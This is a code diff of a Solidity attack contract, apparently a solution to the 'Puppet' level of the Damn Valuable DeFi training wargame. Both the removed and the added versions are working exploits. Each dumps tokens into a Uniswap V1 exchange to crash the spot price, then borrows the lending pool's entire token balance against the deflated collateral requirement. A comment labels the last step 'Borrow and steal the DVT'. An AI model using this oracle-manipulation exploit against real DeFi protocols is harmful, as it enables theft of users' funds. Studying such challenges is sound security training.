@@ -1,79 +1,53 @@
 pragma solidity ^0.8.0;
-import "../DamnValuableToken.sol";
-import "../puppet/PuppetPool.sol";
 
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "hardhat/console.sol";
 
+interface IUniswapExchangeV1 {
+    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns(uint256);
+}
+
+interface IPool {
+    function borrow(uint256 amount, address recipient) external payable;
+}
+
+
 contract AttackPuppet {
-  DamnValuableToken dvt;
-  PuppetPool pool;
 
-  constructor(
-    uint256 initPlayerTokens,
-    uint256 initPoolTokens,
-    uint256 deadline,
-    uint8 v,
-    bytes32 r,
-    bytes32 s,
-    address uniswap,
-    address _token,
-    address _pool
-  ) payable {
-
-    dvt = DamnValuableToken(_token);
-    pool = PuppetPool(_pool);
-
-    // Call permit function with signature provided to allow us 
-    // to transfer the tokens to the contract in one transaction
-    dvt.permit(
-      msg.sender,
-      address(this),
-      initPlayerTokens,
-      deadline,
-      v,
-      r,
-      s
-    );
-    dvt.transferFrom(msg.sender, address(this), initPlayerTokens);
-    printTokenAmounts(address(this));
-
-    // Approve token to swap with UniSwap
-    dvt.approve(uniswap, initPlayerTokens);
-    // Transfer all Tokens for Eth to heavily devalue the Tokens
-    bytes memory tok2Eth = abi.encodeWithSignature("tokenToEthSwapInput(uint256,uint256,uint256)", initPlayerTokens, 9 ether, deadline);
-    (bool success, bytes memory returnData) = uniswap.call(tok2Eth);
-    require(success, "failed to swap");
-
-    printTokenAmounts(address(this));
+    uint256 constant SELL_DVT_AMOUNT = 1000 ether;
+    uint256 constant DEPOSIT_FACTOR = 2;
+    uint256 constant BORROW_DVT_AMOUNT = 100000 ether;
     
-    // Get the new deposit required with the new heavily devalued Token
-    // to get ALL tokens in the pool
-    uint256 deposit = pool.calculateDepositRequired(initPoolTokens);
-    pool.borrow{value: deposit}(initPoolTokens, address(this));
-    printTokenAmounts(address(this));
+    IUniswapExchangeV1 immutable exchange;
+    IERC20 immutable token;
+    IPool immutable pool;
+    address immutable player;
 
-    // Calculate the ethPrice required to get all our original tokens back
-    bytes memory eth2TokPrice = abi.encodeWithSignature("getEthToTokenOutputPrice(uint256)", initPlayerTokens);
-    (success, returnData) = uniswap.call(eth2TokPrice);
-    require(success, "failed to get eth price");
-    uint256 ethPrice = uint256(bytes32(returnData));
-    console.log("Price", ethPrice);
+    constructor(address _token, address _pair, address _pool){
+        token = IERC20(_token);
+        exchange = IUniswapExchangeV1(_pair);
+        pool = IPool(_pool);
+        player = msg.sender;
+    }
 
-    // Swap eth again to get our initial tokens back
-    bytes memory eth2Tok = abi.encodeWithSignature("ethToTokenSwapOutput(uint256,uint256)", initPlayerTokens, deadline);
-    (success, returnData) = uniswap.call{value: ethPrice}(eth2Tok);
-    require(success, "failed to get Tokens back");
-    printTokenAmounts(address(this));
+    function attack() external payable {
+        require(msg.sender == player);
 
-    // Transfer all Tokens and eth back to the player EOA
-    dvt.transfer(msg.sender, dvt.balanceOf(address(this)));
-    payable(msg.sender).transfer(address(this).balance);
-  }
+        // Dump DVT to the Uniswap Pool
+        token.approve(address(exchange), SELL_DVT_AMOUNT);
+        exchange.tokenToEthTransferInput(SELL_DVT_AMOUNT, 9, block.timestamp, address(this));
 
-  // Helper function to print balances (only works in hardhat)
-  function printTokenAmounts(address _add) internal view {
-    console.log("DVT", dvt.balanceOf(_add));
-    console.log("ETH", _add.balance);
-    console.log("");
-  }
+        // Calculate required collateral
+        uint256 price = address(exchange).balance * (10 ** 18) / token.balanceOf(address(exchange));
+        uint256 depositRequired = BORROW_DVT_AMOUNT * price * DEPOSIT_FACTOR / 10 ** 18;
+
+        console.log("contract ETH balance: ", address(this).balance);
+        console.log("DVT price: ", price);
+        console.log("Deposit Required: ", depositRequired);
+
+        // Borrow and steal the DVT
+        pool.borrow{value: depositRequired}(BORROW_DVT_AMOUNT, player);
+    }
+
+    receive() external payable {}
 }
